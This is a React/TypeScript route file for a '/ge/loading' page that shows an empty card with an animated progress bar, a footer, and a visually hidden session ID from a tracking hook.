import { createFileRoute } from "@tanstack/react-router";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({
    meta: [
      { title: "Loading…" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeLoadingPage,
});

const GE_LOADING_CSS = `
${GE_SHELL_CSS}

.ge-loading.ge-shell {
  justify-content: center;
}
.ge-loading .ge-card {
  /* Tall empty card — fluid, never a tiny fixed box */
  width: 100% !important;
  max-width: min(480px, 100%) !important;
  min-height: min(528px, calc(100vh - 120px)) !important;
  height: min(528px, calc(100vh - 120px)) !important;
  padding: 0 !important;
  overflow: hidden !important;
}
@media (min-width: 900px) {
  .ge-loading .ge-card {
    max-width: min(1040px, calc(100vw - 48px)) !important;
    min-height: min(400px, calc(100vh - 120px)) !important;
    height: min(400px, calc(100vh - 120px)) !important;
  }
}

.ge-progress {
  position: absolute;
  left: 20px;
  right: 20px;
  top: 0;
  height: 4px;
  overflow: hidden;
  z-index: 2;
}
@media (min-width: 600px) {
  .ge-progress { left: 24px; right: 24px; }
}
@media (min-width: 900px) {
  .ge-progress { left: 36px; right: 36px; }
}
.ge-progress-bar {
  height: 100%;
  width: 40%;
  background: var(--gm-next-fill);
  border-radius: 0 2px 2px 0;
  animation: ge-indeterminate 1.5s infinite linear;
}
@keyframes ge-indeterminate {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(350%); }
}
.ge-loading-empty {
  flex: 1;
  width: 100%;
  min-height: 100%;
}
`;

function GeLoadingPage() {
  const { sessionId } = useGeTracking();
  return (
    <div className="ge-shell ge-loading">
      <GeFontStyle />
      <style>{GE_LOADING_CSS}</style>

      <main className="ge-card" role="main" aria-busy="true" aria-label="Loading">
        <div className="ge-progress">
          <div className="ge-progress-bar" />
        </div>
        {/* Empty card — only the top blue progress bar moves */}
        <div className="ge-loading-empty" />
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
